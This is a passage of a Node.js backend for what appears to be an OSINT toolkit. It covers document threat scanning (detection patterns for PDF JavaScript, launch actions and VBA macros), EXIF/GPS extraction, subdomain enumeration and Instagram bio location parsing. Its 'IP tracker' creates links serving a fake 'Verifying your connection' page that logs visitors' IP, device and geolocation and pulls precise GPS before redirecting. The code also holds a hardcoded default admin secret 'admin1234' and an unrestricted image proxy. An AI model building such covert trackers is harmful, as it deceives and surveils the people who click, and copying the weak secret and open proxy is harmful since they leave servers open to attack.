  const str = buf.toString("binary");
  const threats = [];
  if (/\/JS[\s(<]|\/JavaScript[\s(<]/.test(str))
    threats.push({ name: "JavaScript Embedded", severity: "high", detail: "PDF contains JavaScript that can run automatically when opened" });
  if (/\/OpenAction[\s<]|\/AA[\s<]/.test(str))
    threats.push({ name: "Auto-Execute Action", severity: "high", detail: "/OpenAction or /AA field causes code to run the moment the file opens" });
  if (/\/Launch[\s<]/.test(str))
    threats.push({ name: "Launch Action", severity: "high", detail: "PDF attempts to launch an external program or shell command" });
  if (/\/EmbeddedFile/.test(str))
    threats.push({ name: "Embedded File Attachment", severity: "medium", detail: "PDF contains one or more embedded file attachments that could be malicious" });
  if (/\/RichMedia/.test(str))
    threats.push({ name: "Rich Media (Flash)", severity: "medium", detail: "PDF embeds Flash/RichMedia content - no longer supported and historically exploited" });
  if (/\/XFA[\s<]/.test(str))
    threats.push({ name: "XFA Form", severity: "medium", detail: "XFA forms can contain embedded scripts executed by some PDF readers" });
  if (/\/JBIG2Decode/.test(str))
    threats.push({ name: "JBIG2Decode Filter", severity: "medium", detail: "JBIG2Decode has been exploited in integer overflow attacks (CVE-2009-0658)" });
  // Embedded PE executable (MZ magic)
  for (let i = 4; i < Math.min(buf.length - 1, 5000000); i++) {
    if (buf[i] === 0x4D && buf[i + 1] === 0x5A) {
      threats.push({ name: "Possible Embedded Executable", severity: "critical", detail: "Windows PE executable signature (MZ) found inside the PDF - strong malware indicator" });
      break;
    }
  }
  const uriCount = (str.match(/\/URI\s*\(/g) || []).length;
  if (uriCount > 0)
    threats.push({ name: `External URLs (${uriCount})`, severity: "low", detail: `PDF references ${uriCount} external URL(s) that may be phishing or tracking links` });
  return threats;
}

function extractZipDocMeta(buf, ext) {
  const AdmZip = require("adm-zip");
  let zip;
  try { zip = new AdmZip(buf); } catch { return { error: "Could not read ZIP-based document" }; }

  const meta = {};
  const threats = [];

  // core.xml - standard OOXML metadata
  const coreEntry = zip.getEntry("docProps/core.xml");
  if (coreEntry) {
    const xml = coreEntry.getData().toString("utf8");
    const grab = (tag) => { const m = xml.match(new RegExp(`<[^:>]*:?${tag}[^>]*>([^<]+)<`)); return m ? m[1].trim() : null; };
    meta.author      = grab("creator") || grab("lastModifiedBy");
    meta.lastSavedBy = grab("lastModifiedBy");
    meta.created     = grab("created");
    meta.modified    = grab("modified");
    meta.title       = grab("title");
    meta.subject     = grab("subject");
    meta.keywords    = grab("keywords");
    meta.description = grab("description");
    const revM = xml.match(/<cp:revision>(\d+)<\/cp:revision>/);
    if (revM) meta.revisions = parseInt(revM[1], 10);
  }

  // app.xml - application-specific metadata
  const appEntry = zip.getEntry("docProps/app.xml");
  if (appEntry) {
    const xml = appEntry.getData().toString("utf8");
    const grab = (tag) => { const m = xml.match(new RegExp(`<[^:>]*:?${tag}[^>]*>([^<]+)<`)); return m ? m[1].trim() : null; };
    meta.software   = grab("Application") || grab("AppVersion");
    meta.company    = grab("Company");
    meta.template   = grab("Template");
    meta.pages      = grab("Pages");
    meta.words      = grab("Words");
    meta.chars      = grab("Characters");
    meta.slides     = grab("Slides");
    const minM = xml.match(/<TotalTime>(\d+)<\/TotalTime>/);
    if (minM) meta.totalEditMinutes = parseInt(minM[1], 10);
    const hiddenM = xml.match(/<HiddenSlides>(\d+)<\/HiddenSlides>/);
    if (hiddenM && parseInt(hiddenM[1], 10) > 0)
      threats.push({ name: "Hidden Slides Detected", severity: "medium", detail: `${hiddenM[1]} hidden slide(s) found - may contain concealed content` });
  }

  // Macros check
  const macroFiles = ["word/vbaProject.bin", "xl/vbaProject.bin", "ppt/vbaProject.bin"];
  const hasMacro = macroFiles.some(f => zip.getEntry(f) !== null);
  if (hasMacro)
    threats.push({ name: "VBA Macros Detected", severity: "high", detail: "Document contains executable VBA macros - a primary delivery mechanism for malware (e.g. Emotet, Dridex)" });

  // External relationships that load remote content
  const entries = zip.getEntries();
  let externalRels = 0;
  for (const e of entries) {
    if (e.entryName.endsWith(".rels")) {
      const content = e.getData().toString("utf8");
      const matches = content.match(/Target="https?:\/\/[^"]+"/g) || [];
      externalRels += matches.length;
    }
  }
  if (externalRels > 0)
    threats.push({ name: `Remote Content Links (${externalRels})`, severity: "medium", detail: `Document loads ${externalRels} resource(s) from external URLs - can be used for tracking or phishing` });

  // Embedded OLE/binary objects
  const oleCount = entries.filter(e => e.entryName.includes("embeddings/") || e.entryName.endsWith(".bin")).length;
  if (oleCount > 1)
    threats.push({ name: `Embedded Objects (${oleCount})`, severity: "medium", detail: `Document contains ${oleCount} embedded binary objects which may include executable content` });

  return { meta, threats };
}

async function checkVirusTotal(sha256) {
  const VT_KEY = process.env.VIRUSTOTAL_KEY;
  if (!VT_KEY) return null;
  try {
    const res = await axios.get(`https://www.virustotal.com/api/v3/files/${sha256}`, {
      headers: { "x-apikey": VT_KEY },
      timeout: 15000,
    });
    const attrs = res.data.data.attributes;
    const stats = attrs.last_analysis_stats || {};
    const total = Object.values(stats).reduce((a, b) => a + b, 0);
    const detectedBy = Object.entries(attrs.last_analysis_results || {})
      .filter(([, v]) => v.category === "malicious" || v.category === "suspicious")
      .map(([engine, v]) => ({ engine, result: v.result, category: v.category }));
    return {
      malicious:  stats.malicious  || 0,
      suspicious: stats.suspicious || 0,
      harmless:   stats.harmless   || 0,
      undetected: stats.undetected || 0,
      total,
      detectedBy,
      fileName: attrs.meaningful_name || null,
      fileType: attrs.type_description || null,
    };
  } catch (err) {
    if (err.response?.status === 404) return { notFound: true };
    console.log("VirusTotal skipped:", err.message);
    return null;
  }
}

app.post("/analyze-document", docUpload.single("file"), async (req, res) => {
  if (!req.file) return res.status(400).json({ error: "No file uploaded" });
  const filePath = req.file.path;

  try {
    const buf = fs.readFileSync(filePath);
    const sha256 = crypto.createHash("sha256").update(buf).digest("hex");
    const originalName = req.file.originalname;
    const ext = path.extname(originalName).toLowerCase().replace(".", "");
    const magicType = detectMagicType(buf);
    const declaredMime = req.file.mimetype;

    // Detect MIME mismatch (e.g. .jpg that's actually a PDF)
    const mimeMap = { pdf: "application/pdf", zip: "office", jpeg: "image/jpeg", png: "image/png", gif: "image/gif", tiff: "image/tiff", ole2: "application/msword" };
    const extMimeMap = { pdf: "pdf", doc: "ole2", docx: "zip", xls: "ole2", xlsx: "zip", ppt: "ole2", pptx: "zip", jpg: "jpeg", jpeg: "jpeg", png: "png", gif: "gif", tiff: "tiff" };
    const expectedMagic = extMimeMap[ext];
    const magicMismatch = expectedMagic && expectedMagic !== magicType && !(expectedMagic === "zip" && magicType === "zip");

    let fileTypeName = ext.toUpperCase() || "Unknown";
    if      (magicType === "pdf")  fileTypeName = "PDF";
    else if (magicType === "zip")  fileTypeName = { docx: "Word Document", xlsx: "Excel Spreadsheet", pptx: "PowerPoint", zip: "ZIP Archive" }[ext] || "OOXML Document";
    else if (magicType === "ole2") fileTypeName = { doc: "Word 97-2003", xls: "Excel 97-2003", ppt: "PowerPoint 97-2003" }[ext] || "OLE2 Document";
    else if (magicType === "jpeg") fileTypeName = "JPEG Image";
    else if (magicType === "png")  fileTypeName = "PNG Image";

    let meta = {};
    let docThreats = [];
    let imageExif = null;

    if (magicType === "pdf") {
      meta = extractPdfMeta(buf);
      docThreats = analyzePdfThreats(buf);
    } else if (magicType === "zip" && ["docx","xlsx","pptx"].includes(ext)) {
      const result = extractZipDocMeta(buf, ext);
      meta = result.meta || {};
      docThreats = result.threats || [];
    } else if (["jpeg","png","gif","tiff"].includes(magicType)) {
      try {
        const exifr = require("exifr");
        imageExif = await exifr.parse(buf, { tiff: true, xmp: true, iptc: true, icc: false, jfif: false, ihdr: false });
      } catch { imageExif = null; }
      if (imageExif) {
        meta.author   = imageExif.Artist || imageExif.Creator?.[0] || imageExif.OwnerName || null;
        meta.software = imageExif.Software || null;
        meta.created  = imageExif.DateTimeOriginal?.toISOString?.() || imageExif.CreateDate?.toISOString?.() || null;
        meta.modified = imageExif.ModifyDate?.toISOString?.() || null;
        meta.camera   = [imageExif.Make, imageExif.Model].filter(Boolean).join(" ") || null;
        meta.gps      = (imageExif.latitude && imageExif.longitude)
          ? { lat: imageExif.latitude, lon: imageExif.longitude }
          : null;
        meta.width    = imageExif.ImageWidth  || imageExif.ExifImageWidth  || null;
        meta.height   = imageExif.ImageHeight || imageExif.ExifImageHeight || null;
        meta.colorSpace = imageExif.ColorSpace ? String(imageExif.ColorSpace) : null;
      }
      if (meta.gps)
        docThreats.push({ name: "GPS Location in Image", severity: "high", detail: `Precise GPS coordinates found: ${meta.gps.lat.toFixed(5)}°, ${meta.gps.lon.toFixed(5)}° - reveals where photo was taken` });
      if (meta.camera)
        docThreats.push({ name: "Camera/Device Identified", severity: "medium", detail: `Device fingerprint: ${meta.camera} - can be used to link photos to a specific device` });
      if (meta.author)
        docThreats.push({ name: "Owner Name in EXIF", severity: "medium", detail: `Author/owner field contains: "${meta.author}"` });
    } else if (magicType === "ole2") {
      // Legacy OLE2 - basic heuristic only
      const str = buf.toString("binary");
      if (/VBA/.test(str))
        docThreats.push({ name: "VBA Macros (Legacy)", severity: "high", detail: "Legacy Office document contains VBA macros - high-risk format used in malware campaigns" });
      docThreats.push({ name: "Legacy Office Format", severity: "low", detail: "DOC/XLS/PPT 97-2003 formats have a broader attack surface than modern OOXML formats" });
    }

    if (magicMismatch)
      docThreats.push({ name: "File Type Mismatch", severity: "high", detail: `Extension is .${ext} but file header indicates ${magicType.toUpperCase()} - possible disguised malware` });

    // VirusTotal hash check
    const vtResult = await checkVirusTotal(sha256);

    // Build privacy risks from metadata
    const privacyRisks = [];
    if (meta.author)
      privacyRisks.push({ type: "Author Name Exposed", detail: `"${meta.author}" is embedded in document metadata`, severity: "high" });
    if (meta.company || meta.organization)
      privacyRisks.push({ type: "Organization Revealed", detail: `"${meta.company || meta.organization}" is embedded in document metadata`, severity: "high" });
    if (meta.lastSavedBy && meta.lastSavedBy !== meta.author)
      privacyRisks.push({ type: "Editor Name Exposed", detail: `"${meta.lastSavedBy}" last saved this document`, severity: "medium" });
    if (meta.revisions > 5)
      privacyRisks.push({ type: "Rich Edit History", detail: `${meta.revisions} revisions tracked - previous versions of content may be recoverable`, severity: "medium" });
    if (meta.template && meta.template !== "Normal.dotm" && meta.template !== "")
      privacyRisks.push({ type: "Internal Template Path", detail: `Template "${meta.template}" may reveal internal file server paths`, severity: "low" });
    if (meta.gps)
      privacyRisks.push({ type: "GPS Coordinates", detail: `Location: ${meta.gps.lat.toFixed(5)}°, ${meta.gps.lon.toFixed(5)}°`, severity: "high" });

    const allThreats = docThreats;
    const hasVtHits = vtResult && !vtResult.notFound && (vtResult.malicious > 0 || vtResult.suspicious > 0);
    const hasCritical = allThreats.some(t => t.severity === "critical") || hasVtHits;
    const hasHigh     = allThreats.some(t => t.severity === "high");

    const threatLevel = hasCritical ? "Malicious" : hasHigh ? "Suspicious" : allThreats.length > 0 ? "Potentially Unsafe" : "Clean";
    const riskLevel   = privacyRisks.some(r => r.severity === "high") ? "High" : privacyRisks.length > 0 ? "Medium" : "Low";

    fs.unlink(filePath, () => {});

    return res.json({
      filename:     originalName,
      fileType:     fileTypeName,
      fileSize:     buf.length,
      sha256,
      magicType,
      mimeMatch:    !magicMismatch,
      meta,
      threats:      allThreats,
      virusTotal:   vtResult,
      privacyRisks,
      threatLevel,
      riskLevel,
    });
  } catch (err) {
    fs.unlink(filePath, () => {});
    console.error("Document analysis error:", err.message);
    return res.status(500).json({ error: "Document analysis failed: " + err.message });
  }
});

// ── Image proxy - used to load Vision similar image thumbnails ────────────────
app.get("/image-proxy", async (req, res) => {
  const url = req.query.url;
  if (!url || !url.startsWith("http")) return res.status(400).end();
  try {
    const r = await axios.get(url, {
      responseType: "arraybuffer",
      timeout: 8000,
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Referer":    new URL(url).origin,
        "Accept":     "image/*,*/*",
      },
      maxRedirects: 5,
    });
    const ct = r.headers["content-type"] || "image/jpeg";
    if (!ct.startsWith("image/")) return res.status(400).end();
    res.setHeader("Content-Type", ct);
    res.setHeader("Cache-Control", "public, max-age=86400");
    return res.send(Buffer.from(r.data));
  } catch {
    return res.status(502).end();
  }
});

// ── Network Exposure Info ─────────────────────────────────────────────────────
app.get("/network-info", async (req, res) => {
  const raw = req.headers["x-forwarded-for"]?.split(",")[0].trim() || req.socket.remoteAddress || "";
  const clientIP = raw.replace("::ffff:", "");

  const exposedHeaders = {
    userAgent:       req.headers["user-agent"]          || null,
    acceptLanguage:  req.headers["accept-language"]     || null,
    acceptEncoding:  req.headers["accept-encoding"]     || null,
    dnt:             req.headers["dnt"]                 || null,
    secChUa:         req.headers["sec-ch-ua"]           || null,
    secChUaMobile:   req.headers["sec-ch-ua-mobile"]    || null,
    secChUaPlatform: req.headers["sec-ch-ua-platform"]  || null,
    referer:         req.headers["referer"]             || null,
  };

  let geo = null;
  try {
    const geoRes = await axios.get(
      `http://ip-api.com/json/${clientIP}?fields=status,country,countryCode,regionName,city,isp,org,proxy,hosting,query`,
      { timeout: 5000 }
    );
    if (geoRes.data?.status === "success") geo = geoRes.data;
  } catch { /* geo stays null */ }

  return res.json({ ip: geo?.query || clientIP, geo, exposedHeaders });
});

// ─────────────────────────────────────────────────────────────────────────────
// Contact / User Queries
// POST /contact        - submit a query (public)
// GET  /admin/queries  - fetch all queries (admin-only, requires secret header)
// PATCH /admin/queries/:id - update status
// ─────────────────────────────────────────────────────────────────────────────
const ADMIN_SECRET = process.env.ADMIN_SECRET || "admin1234";

app.post("/contact", async (req, res) => {
  const { name, email, subject, message } = req.body;
  if (!name || !email || !subject || !message)
    return res.status(400).json({ error: "All fields are required." });

  const { error } = await supabaseAdmin
    .from("contact_queries")
    .insert({ name, email, subject, message, status: "pending" });

  if (error) {
    console.error("Contact insert error:", error.message);
    return res.status(500).json({ error: "Failed to save query." });
  }
  return res.json({ ok: true });
});

app.get("/admin/queries", async (req, res) => {
  if (req.headers["x-admin-secret"] !== ADMIN_SECRET)
    return res.status(403).json({ error: "Forbidden." });

  const { data, error } = await supabaseAdmin
    .from("contact_queries")
    .select("*")
    .order("created_at", { ascending: false });

  if (error) return res.status(500).json({ error: error.message });
  return res.json(data);
});

app.patch("/admin/queries/:id", async (req, res) => {
  if (req.headers["x-admin-secret"] !== ADMIN_SECRET)
    return res.status(403).json({ error: "Forbidden." });

  const { status } = req.body;
  const { error } = await supabaseAdmin
    .from("contact_queries")
    .update({ status })
    .eq("id", req.params.id);

  if (error) return res.status(500).json({ error: error.message });
  return res.json({ ok: true });
});


// Instagram - session-based scraper
// ─────────────────────────────────────────────────────────────────────────────

// Flag emoji → country name.  Each flag is two Regional Indicator letters A-Z.
const FLAG_TO_COUNTRY = {"🇦🇫":"Afghanistan","🇦🇱":"Albania","🇩🇿":"Algeria","🇦🇷":"Argentina","🇦🇺":"Australia","🇦🇹":"Austria","🇧🇩":"Bangladesh","🇧🇪":"Belgium","🇧🇷":"Brazil","🇨🇦":"Canada","🇨🇱":"Chile","🇨🇳":"China","🇨🇴":"Colombia","🇭🇷":"Croatia","🇨🇿":"Czech Republic","🇩🇰":"Denmark","🇪🇬":"Egypt","🇫🇮":"Finland","🇫🇷":"France","🇩🇪":"Germany","🇬🇭":"Ghana","🇬🇷":"Greece","🇭🇰":"Hong Kong","🇭🇺":"Hungary","🇮🇳":"India","🇮🇩":"Indonesia","🇮🇷":"Iran","🇮🇶":"Iraq","🇮🇪":"Ireland","🇮🇱":"Israel","🇮🇹":"Italy","🇯🇵":"Japan","🇯🇴":"Jordan","🇰🇿":"Kazakhstan","🇰🇪":"Kenya","🇰🇵":"North Korea","🇰🇷":"South Korea","🇰🇼":"Kuwait","🇱🇧":"Lebanon","🇲🇾":"Malaysia","🇲🇽":"Mexico","🇲🇦":"Morocco","🇳🇱":"Netherlands","🇳🇿":"New Zealand","🇳🇬":"Nigeria","🇳🇴":"Norway","🇴🇲":"Oman","🇵🇰":"Pakistan","🇵🇸":"Palestine","🇵🇭":"Philippines","🇵🇱":"Poland","🇵🇹":"Portugal","🇶🇦":"Qatar","🇷🇴":"Romania","🇷🇺":"Russia","🇸🇦":"Saudi Arabia","🇷🇸":"Serbia","🇸🇬":"Singapore","🇿🇦":"South Africa","🇪🇸":"Spain","🇸🇩":"Sudan","🇸🇪":"Sweden","🇨🇭":"Switzerland","🇸🇾":"Syria","🇹🇼":"Taiwan","🇹🇿":"Tanzania","🇹🇭":"Thailand","🇹🇳":"Tunisia","🇹🇷":"Turkey","🇦🇪":"UAE","🇬🇧":"United Kingdom","🇺🇸":"United States","🇺🇦":"Ukraine","🇺🇾":"Uruguay","🇺🇿":"Uzbekistan","🇻🇪":"Venezuela","🇻🇳":"Vietnam","🇾🇪":"Yemen","🇿🇲":"Zambia","🇿🇼":"Zimbabwe"};

// Phone country code prefix → country
const PHONE_CC_COUNTRY = {"1":"United States / Canada","7":"Russia","20":"Egypt","27":"South Africa","30":"Greece","31":"Netherlands","32":"Belgium","33":"France","34":"Spain","36":"Hungary","39":"Italy","40":"Romania","41":"Switzerland","43":"Austria","44":"United Kingdom","45":"Denmark","46":"Sweden","47":"Norway","48":"Poland","49":"Germany","51":"Peru","52":"Mexico","53":"Cuba","54":"Argentina","55":"Brazil","56":"Chile","57":"Colombia","58":"Venezuela","60":"Malaysia","61":"Australia","62":"Indonesia","63":"Philippines","64":"New Zealand","65":"Singapore","66":"Thailand","81":"Japan","82":"South Korea","84":"Vietnam","86":"China","90":"Turkey","91":"India","92":"Pakistan","93":"Afghanistan","94":"Sri Lanka","95":"Myanmar","98":"Iran","212":"Morocco","213":"Algeria","216":"Tunisia","218":"Libya","220":"Gambia","221":"Senegal","234":"Nigeria","249":"Sudan","254":"Kenya","255":"Tanzania","256":"Uganda","260":"Zambia","263":"Zimbabwe","380":"Ukraine","381":"Serbia","385":"Croatia","386":"Slovenia","420":"Czech Republic","421":"Slovakia","966":"Saudi Arabia","971":"UAE","972":"Israel","973":"Bahrain","974":"Qatar","962":"Jordan","961":"Lebanon","964":"Iraq","965":"Kuwait","968":"Oman","970":"Palestine","880":"Bangladesh"};

// City name hints → country (for bio parsing)
const CITY_COUNTRY = {"karachi":"Pakistan","lahore":"Pakistan","islamabad":"Pakistan","rawalpindi":"Pakistan","peshawar":"Pakistan","quetta":"Pakistan","multan":"Pakistan","mumbai":"India","delhi":"India","bangalore":"India","hyderabad":"India","chennai":"India","kolkata":"India","dubai":"UAE","abu dhabi":"UAE","riyadh":"Saudi Arabia","jeddah":"Saudi Arabia","cairo":"Egypt","istanbul":"Turkey","ankara":"Turkey","london":"United Kingdom","manchester":"United Kingdom","new york":"United States","los angeles":"United States","chicago":"United States","toronto":"Canada","sydney":"Australia","melbourne":"Australia","paris":"France","berlin":"Germany","madrid":"Spain","rome":"Italy","amsterdam":"Netherlands","moscow":"Russia","beijing":"China","shanghai":"China","tokyo":"Japan","seoul":"South Korea","singapore":"Singapore","kuala lumpur":"Malaysia","jakarta":"Indonesia","bangkok":"Thailand","manila":"Philippines","nairobi":"Kenya","lagos":"Nigeria","casablanca":"Morocco","tunis":"Tunisia"};

function extractCountryFromBio(bio) {
  if (!bio) return null;

  // 1. Flag emoji - most reliable
  for (const [flag, country] of Object.entries(FLAG_TO_COUNTRY)) {
    if (bio.includes(flag)) return { country, source: "flag emoji in bio" };
  }

  const lower = bio.toLowerCase();

  // 2. 📍 pin marker followed by location text
  const pinMatch = bio.match(/📍\s*([^\n,|•·]+)/);
  if (pinMatch) {
    const loc = pinMatch[1].trim();
    // Check if it matches a known city
    for (const [city, country] of Object.entries(CITY_COUNTRY)) {
      if (loc.toLowerCase().includes(city)) return { country, source: `📍 ${loc}`, city: loc };
    }
    return { country: loc, source: `📍 ${loc}`, city: loc };
  }

  // 3. "based in X", "from X", "living in X"
  const patternMatch = lower.match(/(?:based in|from|living in|located in|residing in)\s+([a-z\s]+)/i);
  if (patternMatch) {
    const loc = patternMatch[1].trim().split(/\s*[,|•·\n]/)[0];
    for (const [city, country] of Object.entries(CITY_COUNTRY)) {
      if (loc.includes(city)) return { country, source: `bio: "${patternMatch[0].trim()}"`, city: loc };
    }
    // Title-case it as country guess
    return { country: loc.replace(/\b\w/g, c => c.toUpperCase()), source: `bio: "${patternMatch[0].trim()}"` };
  }

  // 4. Direct city/country name mention
  for (const [city, country] of Object.entries(CITY_COUNTRY)) {
    if (lower.includes(city)) return { country, source: `city mention: "${city}"`, city };
  }

  return null;
}


// ─────────────────────────────────────────────────────────────────────────────
// Contact / User Queries
// ─────────────────────────────────────────────────────────────────────────────
// Subdomain Finder - HackerTarget primary, crt.sh fallback
// GET /scan-subdomains?domain=example.com
// ─────────────────────────────────────────────────────────────────────────────
app.get("/scan-subdomains", async (req, res) => {
  const domain = (req.query.domain || "").toString().trim().toLowerCase()
    .replace(/^https?:\/\//, "").replace(/\/.*$/, "").replace(/^www\./, "");
  if (!domain || !domain.includes(".")) return res.status(400).json({ error: "Valid domain required." });

  const INTERESTING = /admin|api|dev|staging|test|internal|vpn|mail|smtp|ftp|login|dashboard|portal|beta|old|legacy|backup|db|database|secure|auth|sso|cdn|static|jenkins|grafana|kibana|jira|confluence|gitlab|git|ci|build/i;

  const parseSubdomains = (subs, withIPs = false) => {
    const subSet = new Map();
    for (const entry of subs) {
      const [sub, ip] = withIPs ? entry.split(",") : [entry, null];
      const clean = (sub || "").trim().toLowerCase().replace(/^\*\./, "");
      if (clean.endsWith("." + domain) && clean !== domain) {
        subSet.set(clean, ip?.trim() || null);
      }
    }
    return subSet;
  };

  try {
    // ── Source 1: HackerTarget (returns subdomain,IP CSV) ──
    const htRes = await axios.get(
      `https://api.hackertarget.com/hostsearch/?q=${encodeURIComponent(domain)}`,
      { headers: { "User-Agent": "Mozilla/5.0" }, timeout: 15000, validateStatus: () => true }
    );

    let subMap = new Map();
    if (htRes.status === 200 && typeof htRes.data === "string" && !htRes.data.includes("error") && htRes.data.trim()) {
      subMap = parseSubdomains(htRes.data.trim().split("\n"), true);
    }

    // ── Source 2: crt.sh fallback (or supplement when HT is limited) ──
    try {
      const crtRes = await axios.get(
        `https://crt.sh/?q=%.${encodeURIComponent(domain)}&output=json`,
        { headers: { "User-Agent": "Mozilla/5.0", "Accept": "application/json" }, timeout: 18000, validateStatus: () => true }
      );
      if (crtRes.status === 200 && Array.isArray(crtRes.data)) {
        for (const entry of crtRes.data) {
          const names = (entry.name_value || "").split("\n");
          for (const n of names) {
            const clean = n.trim().toLowerCase().replace(/^\*\./, "");
            if (clean.endsWith("." + domain) && clean !== domain && !subMap.has(clean)) {
              subMap.set(clean, null);
            }
          }
        }
      }
    } catch { /* crt.sh is optional */ }

    if (subMap.size === 0) {
      return res.status(404).json({ error: "No subdomains found. The domain may not exist or have no public certificates." });
    }

    const subdomains = [...subMap.entries()].sort((a, b) => a[0].localeCompare(b[0])).map(([sub, ip]) => ({ sub, ip }));
    const interesting = subdomains.filter(({ sub }) => INTERESTING.test(sub.replace("." + domain, "")));

    return res.json({
      domain,
      total:       subdomains.length,
      subdomains,
      interesting,
    });
  } catch (err) {
    console.error("Subdomain scan error:", err.message);
    return res.status(502).json({ error: "Subdomain lookup failed. Try again shortly." });
  }
});

// ── IP Tracker ────────────────────────────────────────────────────────────────
// POST   /tracker/create       - create tracker (auth)
// GET    /tracker/list         - list user's trackers (auth)
// GET    /tracker/:token/hits  - hits for a tracker (auth)
// DELETE /tracker/:token       - delete tracker (auth)
// GET    /t/:token             - public tracking + redirect endpoint
// ─────────────────────────────────────────────────────────────────────────────

function parseUA(ua) {
  if (!ua) return { browser: "Unknown", os: "Unknown", device: "Desktop" };
  let browser = "Unknown";
  if      (/Edg\//.test(ua))     browser = "Edge";
  else if (/OPR\//.test(ua))     browser = "Opera";
  else if (/Chrome\//.test(ua))  browser = "Chrome";
  else if (/Firefox\//.test(ua)) browser = "Firefox";
  else if (/Safari\//.test(ua))  browser = "Safari";
  else if (/curl\//.test(ua))    browser = "cURL";
  else if (/python/.test(ua))    browser = "Python";

  let os = "Unknown";
  if      (/Windows NT 10|Windows NT 11/.test(ua)) os = "Windows 10/11";
  else if (/Windows NT 6\.3/.test(ua))             os = "Windows 8.1";
  else if (/Windows NT 6\.1/.test(ua))             os = "Windows 7";
  else if (/Mac OS X/.test(ua))                    os = "macOS";
  else if (/Android/.test(ua))                     os = "Android";
  else if (/iPhone|iPad/.test(ua))                 os = "iOS";
  else if (/Linux/.test(ua))                       os = "Linux";

  let device = "Desktop";
  if      (/Mobile|Android|iPhone/.test(ua)) device = "Mobile";
  else if (/iPad|Tablet/.test(ua))           device = "Tablet";

  return { browser, os, device };
}

app.post("/tracker/create", verifyAuth, async (req, res) => {
  const { label, redirectUrl } = req.body;
  const token = crypto.randomBytes(10).toString("hex");
  const { data, error } = await supabaseAdmin
    .from("trackers")
    .insert({
      token,
      user_id:      req.user.id,
      label:        (label || "Untitled Tracker").slice(0, 80),
      redirect_url: redirectUrl || "https://www.google.com",
    })
    .select()
    .single();
  if (error) return res.status(500).json({ error: error.message });
  return res.json(data);
});

app.get("/tracker/list", verifyAuth, async (req, res) => {
  const { data, error } = await supabaseAdmin
    .from("trackers")
    .select("id, token, label, redirect_url, created_at, tracker_hits(count)")
    .eq("user_id", req.user.id)
    .order("created_at", { ascending: false });
  if (error) return res.status(500).json({ error: error.message });
  return res.json(data);
});

app.get("/tracker/:token/hits", verifyAuth, async (req, res) => {
  const { data: tracker } = await supabaseAdmin
    .from("trackers").select("id, user_id").eq("token", req.params.token).single();
  if (!tracker || tracker.user_id !== req.user.id)
    return res.status(403).json({ error: "Not found" });
  const { data, error } = await supabaseAdmin
    .from("tracker_hits").select("*").eq("tracker_id", tracker.id)
    .order("clicked_at", { ascending: false });
  if (error) return res.status(500).json({ error: error.message });
  return res.json(data);
});

app.delete("/tracker/:token", verifyAuth, async (req, res) => {
  const { error } = await supabaseAdmin
    .from("trackers").delete().eq("token", req.params.token).eq("user_id", req.user.id);
  if (error) return res.status(500).json({ error: error.message });
  return res.json({ ok: true });
});

// Public tracking endpoint - serves GPS-capture page, records hit
app.get("/t/:token", async (req, res) => {
  const { data: tracker } = await supabaseAdmin
    .from("trackers").select("*").eq("token", req.params.token).single();

  if (!tracker) return res.redirect(302, "https://www.google.com");

  const raw = (req.headers["x-forwarded-for"] || "").split(",")[0].trim()
    || req.socket.remoteAddress || "";
  const ip = raw.replace("::ffff:", "");
  const { browser, os, device } = parseUA(req.headers["user-agent"] || "");

  let country = null, city = null, isp = null, ipLat = null, ipLon = null;
  try {
    const g = await axios.get(
      `http://ip-api.com/json/${ip}?fields=status,country,city,isp,lat,lon`,
      { timeout: 4000 }
    );
    if (g.data?.status === "success") {
      country = g.data.country; city = g.data.city; isp = g.data.isp;
      ipLat = g.data.lat; ipLon = g.data.lon;
    }
  } catch {}

  const { data: hit, error: hitErr } = await supabaseAdmin.from("tracker_hits").insert({
    tracker_id: tracker.id,
    ip, country, city, isp,
    user_agent: (req.headers["user-agent"] || "").slice(0, 500),
    browser, os, device,
    referer: req.headers["referer"] || null,
    ip_lat: ipLat, ip_lon: ipLon,
    gps_lat: null, gps_lon: null,
    location_source: (ipLat && ipLon) ? "ip" : null,
  }).select("id").single();
  if (hitErr) console.error("Tracker hit insert error:", hitErr.message);

  const hitId     = hit?.id || "";
  const redirectTo = tracker.redirect_url.replace(/'/g, "\\'");
  const backendUrl = (process.env.BACKEND_PUBLIC_URL || `http://localhost:5000`);

  const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Loading...</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#0a0a0a;color:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh}
    .wrap{text-align:center;padding:2rem;max-width:320px}
    .ring{width:48px;height:48px;border:3px solid #1e1e1e;border-top:3px solid #6366f1;border-radius:50%;animation:spin .9s linear infinite;margin:0 auto 1.5rem}
    @keyframes spin{to{transform:rotate(360deg)}}
    h2{font-size:1rem;font-weight:500;color:#e5e7eb;margin-bottom:.5rem}
    p{font-size:.8rem;color:#4b5563;line-height:1.5}
    .dots span{animation:blink 1.4s infinite both}
    .dots span:nth-child(2){animation-delay:.2s}
    .dots span:nth-child(3){animation-delay:.4s}
    @keyframes blink{0%,80%,100%{opacity:0}40%{opacity:1}}
  </style>
</head>
<body>
  <div class="wrap">
    <div class="ring"></div>
    <h2>Verifying your connection<span class="dots"><span>.</span><span>.</span><span>.</span></span></h2>
    <p>Please wait while we prepare the content for you</p>
  </div>
  <script>
    var HIT='${hitId}', REDIR='${redirectTo}', API='${backendUrl}';
    var sent=false, fallback=null;

    function go(){ if(!sent){ sent=true; window.location.href=REDIR; } }

    function send(lat,lon,acc){
      if(sent) return;
      sent=true;
      if(fallback) clearTimeout(fallback);
      fetch(API+'/t/${tracker.token}/coords',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({hitId:HIT,lat:lat,lon:lon,accuracy:acc||null})
      }).catch(()=>{}).finally(go);
    }

    // Hard fallback - redirect after 25s no matter what
    fallback = setTimeout(go, 25000);

    if(navigator.geolocation){
      // watchPosition keeps trying until accuracy is good enough
      var watch = navigator.geolocation.watchPosition(
        function(p){
          var acc = p.coords.accuracy;
          // Accept if accuracy <= 50m (good GPS fix) OR after 15s take whatever we have
          if(acc <= 50){
            navigator.geolocation.clearWatch(watch);
            send(p.coords.latitude, p.coords.longitude, acc);
          }
        },
        function(){ go(); },
        {timeout:20000, maximumAge:0, enableHighAccuracy:true}
      );
      // After 15s take best reading we got even if not ideal
